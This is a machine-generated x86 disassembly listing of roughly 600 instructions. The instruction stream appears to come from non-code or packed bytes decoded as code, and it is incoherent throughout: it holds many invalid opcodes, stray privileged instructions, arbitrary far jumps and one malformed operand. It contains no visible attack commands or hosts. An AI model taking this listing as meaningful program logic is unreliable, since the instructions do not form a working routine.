  413e9a:	pop    ebx
  413e9b:	mov    ebx,0xc6e792d9
  413ea0:	mov    ch,BYTE PTR [edx-0x37adccfa]
  413ea6:	nop
  413ea7:	lock mov WORD PTR [ebp+0x35],ds
  413eab:	data16 loop 0x413e53
  413eae:	sbb    eax,esi
  413eb0:	mov    eax,ds:0x5f1163fd
  413eb5:	int3   
  413eb6:	(bad)  
  413eb7:	div    edx
  413eb9:	push   ds
  413eba:	dec    esp
  413ebb:	ss (bad) 
  413ebd:	mov    eax,ds:0x8667a0ec
  413ec2:	pop    ds
  413ec3:	ret    
  413ec4:	rol    BYTE PTR [ecx-0x35],1
  413ec7:	jmp    0x23e68fc3
  413ecc:	cmp    ch,0xa5
  413ecf:	inc    eax
  413ed0:	mov    gs,WORD PTR [edx-0xb]
  413ed3:	xchg   edi,eax
  413ed4:	add    esp,DWORD PTR [ecx+0x5743af57]
  413eda:	xor    al,0x31
  413edc:	mov    eax,gs:0x52169956
  413ee2:	mov    BYTE PTR [eax],ch
  413ee4:	mov    edx,0x9da00cfa
  413ee9:	xor    al,0xd0
  413eeb:	inc    edx
  413eec:	xchg   ecx,eax
  413eed:	repnz fdivr QWORD PTR [eax]
  413ef0:	or     DWORD PTR [edi*1-0x63fd3ee1],edx
  413ef7:	push   ebp
  413ef8:	jle    0x413e7b
  413efa:	pop    esp
  413efb:	jb     0x413f31
  413efd:	jb     0x413ec0
  413eff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f00:	mov    ah,0xb9
  413f02:	in     al,0xac
  413f04:	std    
  413f05:	leave  
  413f06:	cmp    al,0xaf
  413f08:	addr16 repz addr16 xchg edx,eax
  413f0c:	mov    ch,BYTE PTR [esi-0x40e5e9c1]
  413f12:	mov    eax,0xbecc681
  413f17:	aad    0xab
  413f19:	enter  0x7e6d,0xe4
  413f1d:	ds ud2 
  413f20:	es and ch,bh
  413f23:	inc    edx
  413f24:	inc    eax
  413f25:	cli    
  413f26:	jl     0x413f84
  413f28:	popa   
  413f29:	into   
  413f2a:	fdecstp 
  413f2c:	sub    ecx,DWORD PTR [eax+eax*2+0x4c50857c]
  413f33:	je     0x413f79
  413f35:	int3   
  413f36:	popf   
  413f37:	aam    0xec
  413f39:	xor    esi,esp
  413f3b:	or     eax,0xb3c1c6f5
  413f40:	push   edi
  413f41:	pop    ss
  413f42:	mov    ds:0xf754ea41,al
  413f47:	jo     0x413f9f
  413f49:	(bad)  
  413f4a:	cmp    esi,0x6dad4675
  413f50:	fcomp  DWORD PTR [edi+eax*8+0x10]
  413f54:	dec    esi
  413f55:	jmp    0x959d:0x92786059
  413f5c:	rcl    BYTE PTR [eax+ecx*2],cl
  413f5f:	mov    ah,0x68
  413f61:	jle    0x413fb7
  413f63:	jae    0x413fa8
  413f65:	sbb    eax,0x7b830fc9
  413f6a:	push   0xabac99ca
  413f6f:	mov    eax,ds:0x7622946f
  413f74:	push   0x9656c5e5
  413f79:	ror    DWORD PTR [esi-0x80f0a0a],0xa6
  413f80:	sbb    bh,BYTE PTR [ebx]
  413f82:	scas   al,BYTE PTR es:[edi]
  413f83:	call   0x1c929671
  413f88:	out    0xe0,al
  413f8a:	loope  0x413f9d
  413f8c:	inc    ecx
  413f8d:	jle    0x413fd5
  413f8f:	iret   
  413f90:	push   es
  413f91:	stos   DWORD PTR es:[edi],eax
  413f92:	push   es
  413f93:	lea    edx,[edi]
  413f95:	outs   dx,BYTE PTR ds:[esi]
  413f96:	fdivr  st(2),st
  413f98:	fwait
  413f99:	repz jmp 0xa456ba3f
  413f9f:	les    edx,FWORD PTR [esp+ebp*2]
  413fa2:	xchg   edi,eax
  413fa3:	pop    ebx
  413fa4:	pop    esi
  413fa5:	mov    ebx,0x4408fb9f
  413faa:	repnz scas al,BYTE PTR es:[edi]
  413fac:	inc    esp
  413fad:	repnz loope 0x413f42
  413fb0:	mov    edx,0x53d74974
  413fb5:	push   esi
  413fb6:	or     ebx,DWORD PTR [esp+edx*1+0x46ad19e2]
  413fbd:	push   esp
  413fbe:	mul    BYTE PTR [ecx]
  413fc0:	mov    dl,0x3
  413fc2:	sub    dh,bl
  413fc4:	fadd   DWORD PTR [eax+0xaeb87f8]
  413fca:	frstor ss:0x9ab2808e
  413fd1:	add    BYTE PTR [eax-0x7685d710],bl
  413fd7:	and    ecx,DWORD PTR [esi-0x4a470c1e]
  413fdd:	aad    0x14
  413fdf:	ins    DWORD PTR es:[edi],dx
  413fe0:	out    dx,al
  413fe1:	push   eax
  413fe2:	jmp    0x41403d
  413fe4:	xor    ebp,DWORD PTR [bx+0x78]
  413fe8:	jle    0x413fb6
  413fea:	hlt    
  413feb:	repnz sbb al,BYTE PTR [esi+ebx*2+0x49]
  413ff0:	jecxz  0x414001
  413ff2:	mov    ds:0xbbffc9fd,al
  413ff7:	retf   0x426
  413ffa:	sbb    BYTE PTR [ecx-0x6748f7e2],dh
  414000:	jo     0x413f8a
  414002:	or     eax,0xc95a5c1c
  414007:	push   edx
  414008:	test   BYTE PTR [eax],bl
  41400a:	add    DWORD PTR [ebx-0xc],ecx
  41400d:	leave  
  41400e:	xchg   esi,ebp
  414010:	or     al,0x9c
  414012:	in     eax,0x16
  414014:	xor    dh,cl
  414016:	cmp    al,0x27
  414018:	(bad)  
  41401a:	and    eax,0x273fc137
  41401f:	leave  
  414020:	nop
  414021:	pop    edi
  414022:	pop    ecx
  414023:	mov    eax,ds:0xd86392d1
  414028:	loopne 0x413fce
  41402a:	call   0x4758:0x386c201b
  414031:	fwait
  414032:	pop    eax
  414033:	or     al,0x52
  414035:	retf   
  414036:	jo     0x413fdb
  414038:	push   0xffffffa5
  41403a:	pop    ebx
  41403b:	xor    DWORD PTR [ebp-0x5ae2fc53],eax
  414041:	xor    esi,ebx
  414043:	outs   dx,BYTE PTR ds:[esi]
  414044:	dec    ebp
  414045:	repnz dec esp
  414047:	pop    ds
  414048:	hlt    
  414049:	div    dl
  41404b:	aas    
  41404c:	shl    BYTE PTR [esi+0x37],cl
  41404f:	inc    edx
  414050:	mov    dl,0x58
  414052:	or     ecx,DWORD PTR [eax+ebp*4]
  414055:	lahf   
  414056:	lea    esp,[edi+0xc3cee4e]
  41405c:	ss aam 0xec
  41405f:	fstp   QWORD PTR [ebp+eax*2+0x63a77f2]
  414066:	xor    eax,0xc59e4119
  41406b:	inc    esp
  41406c:	pusha  
  41406d:	out    dx,eax
  41406e:	push   cs
  41406f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414070:	in     eax,0x98
  414072:	in     al,dx
  414073:	dec    ebx
  414074:	stc    
  414075:	stos   BYTE PTR es:[edi],al
  414076:	stc    
  414077:	sub    dh,BYTE PTR [edi+edi*8+0x4ba556e9]
  41407e:	xchg   ebx,eax
  41407f:	mov    ds:0xe0922f4f,eax
  414084:	push   esp
  414085:	push   cs
  414086:	push   esp
  414087:	sub    al,al
  414089:	sar    DWORD PTR [eax+ebp*1],0xbd
  41408d:	retf   0xb5a0
  414090:	out    0x9f,eax
  414092:	cmc    
  414093:	aaa    
  414094:	inc    ebx
  414095:	push   cs
  414096:	(bad)  
  414097:	or     esi,ebp
  414099:	push   ds
  41409a:	jns    0x41409d
  41409c:	scas   al,BYTE PTR es:[edi]
  41409d:	fcom   DWORD PTR [ebx-0x7f]
  4140a0:	lahf   
  4140a1:	clc    
  4140a2:	dec    edx
  4140a3:	mov    edi,0xf02dc022
  4140a8:	sub    ebx,eax
  4140aa:	stos   DWORD PTR es:[edi],eax
  4140ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140ac:	mov    edx,0xea58b89e
  4140b1:	mov    esi,DWORD PTR [edx-0x4eb8c88b]
  4140b7:	inc    ebp
  4140b8:	xchg   dh,bl
  4140ba:	adc    DWORD PTR [edi+0x2e95f59],ebp
  4140c0:	repnz loope 0x41404a
  4140c3:	sbb    DWORD PTR [ebx+0x22],0xf
  4140c7:	jp     0x41411e
  4140c9:	pop    ecx
  4140ca:	mov    ah,0x61
  4140cc:	push   esi
  4140cd:	repz xchg ecx,eax
  4140cf:	mov    eax,ds
  4140d1:	in     al,dx
  4140d2:	dec    ebx
  4140d3:	stos   BYTE PTR es:[edi],al
  4140d4:	mov    ebp,0xb208e9fc
  4140d9:	xor    eax,0x98fae50f
  4140de:	pushf  
  4140df:	jae    0x41407f
  4140e1:	sub    bl,BYTE PTR [edx]
  4140e3:	sbb    eax,0x33faa088
  4140e8:	mov    esi,0x4326432
  4140ed:	jbe    0x41408d
  4140ef:	mov    esi,0x44298198
  4140f4:	push   ss
  4140f5:	mov    dh,0xb0
  4140f7:	imul   esi,ebp,0xffffffd4
  4140fa:	sub    BYTE PTR [edi],ch
  4140fc:	dec    esp
  4140fd:	or     DWORD PTR [ebx-0x7f47d722],edi
  414103:	in     al,0xb0
  414105:	loopne 0x4140d7
  414107:	fcmovnu st,st(1)
  414109:	daa    
  41410a:	div    BYTE PTR [eax-0x7c7ca5c0]
  414110:	mov    edx,0x17a00215
  414115:	inc    edx
  414116:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414117:	cwde   
  414118:	fnstcw WORD PTR [edi+ebx*8-0x5e]
  41411c:	pusha  
  41411d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41411e:	sbb    eax,0xf2cdc42b
  414123:	xor    BYTE PTR [eax-0x66],dl
  414126:	fldenv [eax-0x31]
  414129:	or     bh,ch
  41412b:	nop
  41412c:	hlt    
  41412d:	fs pop esi
  41412f:	xchg   ebp,eax
  414130:	ss push es
  414132:	(bad)  
  414134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414135:	pop    ecx
  414136:	jno    0x414138
  414138:	out    dx,al
  414139:	js     0x414163
  41413b:	jle    0x4140d8
  41413d:	sub    eax,0x50717e35
  414142:	popf   
  414143:	xor    BYTE PTR [ecx-0x6c],bl
  414146:	inc    edi
  414147:	(bad)  
  414149:	cmp    esi,DWORD PTR [edx-0x68]
  41414c:	dec    ebx
  41414d:	dec    edi
  41414e:	xchg   edx,eax
  41414f:	mov    bl,0x40
  414151:	in     al,dx
  414152:	aaa    
  414153:	push   ds
  414154:	mov    DWORD PTR [ebp-0x706143d6],ecx
  41415a:	call   0x3c3e5bcc
  41415f:	aas    
  414160:	dec    ecx
  414161:	je     0x4141bd
  414163:	cmp    eax,0xf40464f2
  414168:	or     DWORD PTR [ecx-0xd],edi
  41416b:	xchg   ecx,eax
  41416c:	ret    
  41416d:	cmp    BYTE PTR [ecx+ebx*1+0x796e92d5],bl
  414174:	mov    bh,0xfc
  414176:	push   edx
  414177:	mov    dh,al
  414179:	cmp    bl,BYTE PTR [ecx-0x57032a56]
  41417f:	mov    ds:0x43581155,al
  414184:	lods   eax,DWORD PTR ds:[esi]
  414185:	push   ecx
  414186:	or     eax,esi
  414188:	fst    DWORD PTR [esi+ecx*2-0x6664eb55]
  41418f:	add    al,BYTE PTR [edi-0x4e853cc0]
  414195:	push   ecx
  414196:	pushf  
  414197:	daa    
  414198:	jge    0x41419e
  41419a:	sub    BYTE PTR [edi],dl
  41419c:	add    BYTE PTR [ecx-0x446860ee],dh
  4141a2:	aas    
  4141a3:	call   esp
  4141a5:	das    
  4141a6:	pushf  
  4141a7:	ror    DWORD PTR [edx-0x60],0x2c
  4141ab:	les    edx,FWORD PTR [edx-0x33f61620]
  4141b1:	jmp    0x4627:0x562f8f5f
  4141b8:	pop    ebx
  4141b9:	xchg   esp,eax
  4141ba:	scas   al,BYTE PTR es:[edi]
  4141bb:	mov    bh,0xf3
  4141bd:	out    0x78,al
  4141bf:	je     0x4141bc
  4141c1:	jl     0x41420d
  4141c3:	jecxz  0x4141a5
  4141c5:	clc    
  4141c6:	adc    ebp,DWORD PTR [edi]
  4141c8:	or     esp,DWORD PTR [edi+0x6]
  4141cb:	dec    esi
  4141cc:	or     edi,DWORD PTR [edx]
  4141ce:	mov    ds:0x79c6b917,eax
  4141d3:	dec    ebx
  4141d4:	sti    
  4141d5:	les    esp,FWORD PTR [eax+0x37]
  4141d8:	mov    dh,0xf7
  4141da:	outs   dx,BYTE PTR ds:[esi]
  4141db:	or     BYTE PTR [eax-0x7a],bl
  4141de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141df:	pop    esp
  4141e0:	ds dec esp
  4141e2:	xchg   edi,eax
  4141e3:	sub    dl,BYTE PTR [edi+0x4e]
  4141e6:	adc    dh,dl
  4141e8:	push   ecx
  4141e9:	and    BYTE PTR [edi+0x57dc0bb4],bh
  4141ef:	xor    al,0x65
  4141f1:	test   al,0x73
  4141f3:	cmc    
  4141f4:	sub    eax,0xb2a69d41
  4141f9:	cmp    DWORD PTR [ebx],0x23
  4141fc:	push   0x53
  4141fe:	pusha  
  4141ff:	cmp    eax,0x829b0853
  414204:	xor    eax,0xff24502f
  414209:	mov    ah,0xbb
  41420b:	mov    edx,0x5c6b3cb7
  414210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414211:	out    dx,eax
  414212:	mov    DWORD PTR [edi],esi
  414214:	aad    0xa7
  414216:	sbb    cl,cl
  414218:	dec    edx
  414219:	xor    DWORD PTR [edi],0x53
  41421c:	(bad)
  41421f:	push   ebx
  414220:	cmp    eax,0x7791c15e
  414225:	and    ecx,DWORD PTR [ebx]
  414227:	shl    BYTE PTR [ebp+0x3e],0x36
  41422b:	xor    eax,0x28187e5f
  414230:	mov    bh,0x5d
  414232:	fwait
  414233:	aad    0x2f
  414235:	or     eax,0x7f17237c
  41423a:	jo     0x414285
  41423c:	adc    DWORD PTR [ebx],edx
  41423e:	mov    ds:0xa2089504,eax
  414243:	sbb    ebx,0xffffffb6
  414246:	xor    esi,DWORD PTR [edi]
  414248:	pop    edx
  414249:	push   edx
  41424a:	popf   
  41424b:	js     0x4142ac
  41424d:	in     al,0x39
  41424f:	jnp    0x4141de
  414251:	lds    ebp,FWORD PTR [ecx]
  414253:	cdq    
  414254:	jecxz  0x4141f7
  414256:	stos   DWORD PTR es:[edi],eax
  414257:	test   BYTE PTR [edi+0x22a74a77],0x30
  41425e:	inc    esi
  41425f:	jl     0x41422d
  414261:	push   eax
  414262:	sar    DWORD PTR [ebx+0x11995f0b],0x9f
  414269:	lock scas eax,DWORD PTR es:[edi]
  41426b:	push   es
  41426c:	js     0x41426b
  41426e:	(bad)  
  41426f:	rcl    esi,1
  414271:	stc    
  414272:	cmc    
  414273:	mov    al,0x43
  414275:	or     DWORD PTR fs:[eax],0x95728324
  41427c:	cdq    
  41427d:	pop    ecx
  41427e:	and    al,0x3b
  414280:	sub    esp,DWORD PTR [ebp-0x5e21621b]
  414286:	call   DWORD PTR ds:0x12bb2a37
  41428c:	ss or  eax,0x8899a9b1
  414292:	inc    ecx
  414293:	inc    edi
  414294:	out    dx,eax
  414295:	xchg   DWORD PTR [edx+eiz*1-0x62d0ba70],edi
  41429c:	cld    
  41429d:	sub    DWORD PTR [ebx-0x74784364],ebp
  4142a3:	sub    ecx,esi
  4142a5:	adc    DWORD PTR [esi+0x42],edx
  4142a8:	idiv   DWORD PTR [ecx+0x1558aa0c]
  4142ae:	fnstenv [edx-0x56380eda]
  4142b4:	mov    ss,WORD PTR ds:0x6130853
  4142ba:	enter  0x25c5,0xbf
  4142be:	jmp    0x57f7de9e
  4142c3:	pop    edx
  4142c4:	xchg   esi,eax
  4142c5:	jbe    0x41431b
  4142c7:	std    
  4142c8:	mov    dh,0xcc
  4142ca:	loope  0x414258
  4142cc:	(bad)  
  4142ce:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142d0:	xchg   edx,eax
  4142d1:	sar    BYTE PTR [ecx+0x48],cl
  4142d4:	mov    esi,0xa267f053
  4142d9:	cmp    BYTE PTR [esi],ah
  4142db:	dec    edi
  4142dc:	scas   eax,DWORD PTR es:[edi]
  4142dd:	xor    al,BYTE PTR [edx]
  4142df:	sbb    ch,BYTE PTR [ebx+0x6c79dd11]
  4142e5:	sub    al,0xde
  4142e7:	inc    esi
  4142e8:	into   
  4142e9:	ja     0x41428a
  4142eb:	sub    DWORD PTR [esi-0x344fcaf9],edx
  4142f1:	repnz mov al,ds:0xfc194fb1
  4142f7:	sti    
  4142f8:	fadd   DWORD PTR [esi]
  4142fa:	xor    al,0x1
  4142fc:	mov    al,ds:0x2c58e70e
  414301:	popa   
  414302:	push   0x4f
  414304:	mov    dl,0xa1
  414306:	sbb    eax,0x61cf2194
  41430b:	add    al,0x87
  41430d:	adc    ebp,eax
  41430f:	enter  0x478f,0xa1
  414313:	mov    ebx,DWORD PTR [ecx+0x7]
  414316:	cld    
  414317:	push   0xabdda6be
  41431c:	sub    bh,BYTE PTR [ecx+0x17be775d]
  414322:	or     al,0x3a
  414324:	jecxz  0x4142f7
  414326:	dec    ebp
  414327:	in     al,dx
  414328:	(bad)  
  414329:	pusha  
  41432a:	jbe    0x414372
  41432c:	sbb    ecx,DWORD PTR [edi]
  41432e:	cmp    ebp,DWORD PTR [ebp+0x30]
  414331:	sti    
  414332:	aas    
  414333:	mov    edi,0x5a95664f
  414338:	or     DWORD PTR [esi-0x35],0xabfa5ec1
  41433f:	inc    ebx
  414340:	pop    ebx
  414341:	inc    edx
  414342:	(bad)  
  414343:	mov    cl,0xa7
  414345:	scas   eax,DWORD PTR es:[edi]
  414346:	mov    al,0x43
  414348:	push   0x24
  41434a:	fadd   QWORD PTR [eax+0x6e]
  41434d:	xor    BYTE PTR [ebp+ebx*8-0x39bb59a8],ch
  414354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414355:	std    
  414356:	loop   0x41438c
  414358:	ret    
  414359:	adc    dl,BYTE PTR [ebx+0x7c]
  41435c:	repz (bad) 
  41435e:	sbb    dl,BYTE PTR [ecx-0x7e8747c7]
  414364:	mov    cl,0x14
  414366:	scas   eax,DWORD PTR es:[edi]
  414367:	loope  0x41433d
  414369:	leave  
  41436a:	jmp    0x4c27d02e
  41436f:	hlt    
  414370:	mov    BYTE PTR ds:0xfb219bbd,0x76
  414377:	aas    
  414378:	cli    
  414379:	sbb    eax,0x585f60e
  41437e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41437f:	ret    
  414380:	dec    eax
  414381:	pushw  cs
  414383:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414384:	neg    bh
  414386:	dec    edi
  414387:	fist   DWORD PTR [ebx+0x52]
  41438a:	test   BYTE PTR [edx],dl
  41438c:	ret    
  41438d:	ret    0xb250
  414390:	test   al,0x9e
  414392:	ror    BYTE PTR [esi],cl
  414394:	(bad)  
  414395:	mov    ah,0x73
  414397:	fisubr DWORD PTR [edi]
  414399:	sub    edx,edi
  41439b:	ficom  DWORD PTR [eax-0x66f86680]
  4143a1:	and    esp,DWORD PTR [edx-0x644184df]
  4143a7:	jo     0x414415
  4143a9:	or     edx,DWORD PTR [ebx+0x52afdc32]
  4143af:	(bad)  
  4143b0:	jecxz  0x414379
  4143b2:	push   ds
  4143b3:	out    0x31,al
  4143b5:	mov    ch,0xab
  4143b7:	mov    dh,0x5b
  4143b9:	js     0x41435c
  4143bb:	inc    esi
  4143bc:	(bad)  
  4143bd:	gs pop es
  4143bf:	pop    edi
  4143c0:	jmp    0x2bdb:0xdbdb13d6
  4143c7:	cld    
  4143c8:	xor    ecx,DWORD PTR [eax-0x63]
  4143cb:	std    
  4143cc:	add    esp,DWORD PTR [esi]
  4143ce:	int    0x79
  4143d0:	dec    edi
  4143d1:	(bad)  
  4143d2:	popa   
  4143d3:	ins    BYTE PTR es:[edi],dx
  4143d4:	push   cs
  4143d5:	js     0x4143d1
  4143d7:	or     al,0xf4
  4143d9:	jae    0x41444b
  4143db:	adc    BYTE PTR [ebp+0x3],bl
  4143de:	data16 cld 
  4143e0:	mov    edx,0x1368e1ba
  4143e5:	loop   0x414406
  4143e7:	jb     0x4143f0
  4143e9:	leave  
  4143ea:	xlat   BYTE PTR ds:[ebx]
  4143eb:	add    al,0x84
  4143ed:	inc    edx
  4143ee:	int3   
  4143ef:	mov    ebx,0x79bd5e74
  4143f4:	xchg   esi,eax
  4143f5:	enter  0x43ed,0x16
  4143f9:	ja     0x414408
  4143fb:	xchg   esp,eax
  4143fc:	(bad)  
  4143fe:	fstp   TBYTE PTR es:[ebp+0x48]
  414402:	aaa    
  414403:	mov    ah,0xef
  414405:	and    bh,dl
  414407:	dec    esp
  414408:	dec    edi
  414409:	(bad)  
  41440a:	cli    
  41440b:	es fwait
  41440d:	popa   
  41440e:	mov    dl,0xd9
  414410:	and    ah,BYTE PTR es:[ecx+0x7d]
  414414:	xchg   edi,eax
  414415:	inc    eax
  414416:	jae    0x41446e
  414418:	shr    DWORD PTR [edx+ebx*4],cl
  41441b:	aad    0x74
  41441d:	sub    dl,BYTE PTR [ebx+0x63]
  414420:	leave  
  414421:	or     eax,0xea0143
  414426:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414427:	sahf   
  414428:	popf   
  414429:	fsubr  QWORD PTR [edx-0x13]
  41442c:	cmp    cl,BYTE PTR [eax+eiz*4]
  41442f:	xor    al,0x3d
  414431:	or     edi,DWORD PTR [edx]
  414433:	adc    BYTE PTR [ebp+ebx*1-0x14ab3548],cl
  41443a:	add    DWORD PTR [esi-0x6a605ba9],eax
  414440:	push   eax
  414441:	fldcw  WORD PTR [edi]
  414443:	(bad)  
  414444:	ins    DWORD PTR es:[edi],dx
  414445:	ins    DWORD PTR es:[edi],dx
  414446:	sbb    al,0x9f
  414448:	pop    ss
  414449:	ja     0x4143f1
  41444b:	inc    ebp
  41444c:	xchg   ebp,edx
  41444e:	mov    dh,0x4f
  414450:	add    eax,0x1e25d36d
  414455:	std    
  414456:	mov    bh,0x44
  414458:	lods   al,BYTE PTR ds:[esi]
  414459:	sbb    BYTE PTR ds:0xf846266c,dh
  41445f:	mov    eax,ds:0xbb5262e8
  414464:	mov    ebx,0x5313bb93
  414469:	nop
  41446a:	pop    ds
  41446b:	pop    ss
  41446c:	xor    eax,0x37c2e757
  414471:	or     eax,0xc4303b2d
  414476:	test   al,0x7d
  414478:	jge    0x4144f9
  41447a:	inc    edi
  41447b:	mov    WORD PTR [ebp-0x80],?
  41447e:	or     eax,0x3a890191
  414483:	leave  
  414484:	loope  0x414504
  414486:	cli    
  414487:	repz aam 0xfa
  41448a:	xor    bl,BYTE PTR [ebp+edi*2-0x5d0a9063]
  414491:	adc    ebx,DWORD PTR [edi+0x4ef14e19]
  414497:	adc    dh,bl
  414499:	outs   dx,BYTE PTR ds:[esi]
  41449a:	ret    0x1f04
  41449d:	xor    esi,DWORD PTR ds:0xa0821961
  4144a3:	xor    DWORD PTR [edi],ebp
  4144a5:	mov    ds:0xd5fcfea0,eax
  4144aa:	mov    ebx,0xc3307ee1
  4144af:	fisub  DWORD PTR [edx-0x75ad9c6f]
  4144b5:	into   
  4144b6:	in     eax,0xa1
  4144b8:	adc    ch,BYTE PTR [eax]
  4144ba:	ret    0x6a84
  4144bd:	lods   eax,DWORD PTR ds:[esi]
  4144be:	mov    bh,0x2a
  4144c0:	dec    ebp
  4144c1:	add    al,0x57
  4144c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144c4:	(bad)  
  4144c5:	arpl   WORD PTR [edi+0x6f21479f],bx
  4144cb:	push   cs
  4144cc:	xchg   ebp,eax
  4144cd:	test   DWORD PTR [edi+0x74741509],ecx
  4144d3:	and    al,0xa2
  4144d5:	pushf  
  4144d6:	sbb    dh,BYTE PTR [edx+0x130cfb4d]
  4144dc:	int3   
  4144dd:	jo     0x414558
  4144df:	sub    edx,DWORD PTR [ebx+0x23]
  4144e2:	in     al,0x8e
  4144e4:	sahf   
  4144e5:	ja     0x414544
  4144e7:	aad    0xae
  4144e9:	sub    BYTE PTR [ebx-0x28],cl
  4144ec:	xor    al,0x6
  4144ee:	push   ss
  4144ef:	push   ecx
  4144f0:	cmp    al,0xb0
  4144f2:	jae    0x414475
  4144f4:	(bad)  
  4144f5:	imul   esi,edx,0xfffffff7
  4144f8:	jecxz  0x414522
  4144fa:	push   eax
  4144fb:	fnsave [edx+0x56]
  4144fe:	jae    0x41457d
  414500:	mov    al,gs:0x3af770c7
  414506:	cmp    dh,0x24
  414509:	or     dl,BYTE PTR [edi-0x1917b3c4]
  41450f:	lds    esi,FWORD PTR [ebx+ecx*1+0x25]
  414513:	xchg   edx,eax
  414514:	(bad)  
  414515:	pop    ss
  414516:	mov    cl,BYTE PTR [eax]
  414518:	add    eax,0x520fd34
  41451d:	pop    es
  41451e:	sbb    BYTE PTR [edx-0x18],al
  414521:	cwde   
  414522:	ffree  st(3)
  414524:	hlt    
  414525:	loope  0x4144f1
  414527:	cs pop eax
  414529:	scas   al,BYTE PTR es:[edi]
  41452a:	dec    esi
  41452b:	mov    BYTE PTR [ecx+0x4e73d396],al
  414531:	inc    esi
  414532:	dec    eax
  414533:	add    eax,0x89df30ce
  414538:	sub    BYTE PTR [ebp+0x5b0c143],bh
  41453e:	cwde   
  41453f:	xor    dh,BYTE PTR [edi]
  414541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414542:	or     eax,DWORD PTR [ebx-0x41]
  414545:	icebp  
  414546:	jnp    0x4144d9
  414548:	stc    
  414549:	sbb    al,0x15
  41454b:	lea    edx,[ecx+ebp*1-0x7d]
  41454f:	loope  0x4145c9
  414551:	pop    ebx
  414552:	sub    DWORD PTR [edx+eiz*2+0x4736fb34],eax
  414559:	xor    DWORD PTR [ebp-0x2a844478],esp
  41455f:	scas   al,BYTE PTR es:[edi]
  414560:	sub    ecx,ecx
  414562:	cmp    DWORD PTR [edi],edi
  414564:	int    0xae
  414566:	cmp    dl,BYTE PTR [esi-0x40]
  414569:	call   FWORD PTR [edi]
  41456b:	dec    ecx
  41456c:	sbb    al,0x29
  41456e:	test   dl,dh
  414570:	lock push ebx
  414572:	enter  0x4094,0xdb
  414576:	imul   esi,DWORD PTR [edx-0x3393c785],0x13439b3c
  414580:	std    
  414581:	adc    eax,0xb9e6899e
  414586:	sbb    eax,0x5364c394
  41458b:	add    al,dh
  41458d:	mov    edi,0x384aca9f
  414592:	pop    edi
  414593:	pop    ecx
  414594:	push   eax
  414595:	(bad)  
  414597:	inc    eax
  414598:	pop    eax
  414599:	shl    DWORD PTR [edi+0x7fe7e052],1
  41459f:	xor    DWORD PTR [eax],esp
  4145a1:	mov    ebp,0x3465612a
  4145a6:	jecxz  0x41455e
  4145a8:	packsswb mm7,QWORD PTR [ecx-0x3e]
  4145ac:	inc    eax
  4145ad:	mul    esi
  4145af:	xchg   BYTE PTR [ebp+0x38526e68],bl
  4145b5:	arpl   dx,si
  4145b7:	daa    
  4145b8:	fisub  DWORD PTR [ebp+0x177630d3]
  4145be:	push   eax
  4145bf:	cmp    DWORD PTR [ebp+0x7513e764],0x62
  4145c6:	out    dx,al
  4145c7:	enter  0x36ba,0xad
  4145cb:	ret    
  4145cc:	mov    ah,0x7e
  4145ce:	sub    eax,0x7f12f187
  4145d3:	fcomp  st(1)
  4145d5:	enter  0xf2d0,0xda
  4145d9:	push   0xffffffb0
  4145db:	fdivr  QWORD PTR ds:0x63f99c60
  4145e1:	push   ss
  4145e2:	add    esi,DWORD PTR [edi+0x2d]
  4145e5:	fsubr  QWORD PTR [edi-0x41da49ca]
  4145eb:	pop    ecx
  4145ec:	cwde   
  4145ed:	fild   WORD PTR [ebx+0x5f]
  4145f0:	push   ecx
  4145f1:	mov    ecx,eax
  4145f3:	cwde   
  4145f4:	mov    bl,0x2c
  4145f6:	(bad)  
  4145f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145f8:	mov    ah,0x3f
  4145fa:	inc    edx
  4145fb:	fimul  DWORD PTR [ebx+0x56]
  4145fe:	lahf   
  4145ff:	and    BYTE PTR [edx+ecx*2],ch
  414602:	shr    esp,cl
  414604:	jae    0x4145eb
  414606:	xchg   ebp,eax
  414607:	out    dx,al
  414608:	clc    
  414609:	test   DWORD PTR [ebp-0x2c53e2ab],ebx
  41460f:	je     0x414596
  414611:	inc    ebp
  414612:	popa   
  414613:	sub    DWORD PTR [edi+0x5c1e7811],0xffffffa8
  41461a:	dec    edx
  41461b:	mov    ch,0x93
  41461d:	dec    edx
  41461e:	repnz test al,0xa8
  414621:	mov    eax,0x50c6641
  414626:	mov    eax,0x96f2bff8
  41462b:	icebp  
  41462c:	xor    al,0xd0
  41462e:	scas   al,BYTE PTR es:[edi]
  41462f:	(bad)  
  414631:	in     al,dx
  414632:	xor    bl,BYTE PTR [edx+0x13]
  414635:	aad    0xf8
  414637:	xchg   edi,eax
  414638:	push   edx
  414639:	leave  
  41463a:	dec    ebx
  41463b:	and    ah,BYTE PTR [esi+ebp*4-0x9144880]
  414642:	fidivr DWORD PTR [edi]
  414644:	icebp  
  414645:	cmp    eax,0xb193d1f
  41464a:	mov    BYTE PTR [edi-0x6f],bh
  41464d:	std    
  41464e:	xor    al,ch
  414650:	pop    edx
  414651:	test   al,0x99
  414653:	inc    esp
  414654:	mov    eax,ds:0xd098bec0
  414659:	mov    al,ds:0x18e867e2
  41465e:	adc    al,0x90
  414660:	ret    
  414661:	shr    BYTE PTR [edx-0x16ccfea],1
  414667:	leave  
  414668:	pop    edi
  414669:	push   es
  41466a:	and    al,0xa4
  41466c:	(bad)  
  41466e:	ffree  st(3)
  414670:	imul   BYTE PTR [esi]
  414672:	test   eax,0x60418b04
  414677:	inc    edx
  414678:	and    esp,DWORD PTR [ebp-0x6e]
  41467b:	sub    DWORD PTR [edi],0x45bae347
  414681:	jbe    0x4146c9
  414683:	inc    edi
  414684:	sbb    al,BYTE PTR [edi+esi*2+0x60]
  414688:	jmp    0xbc3a:0xeaa03afe
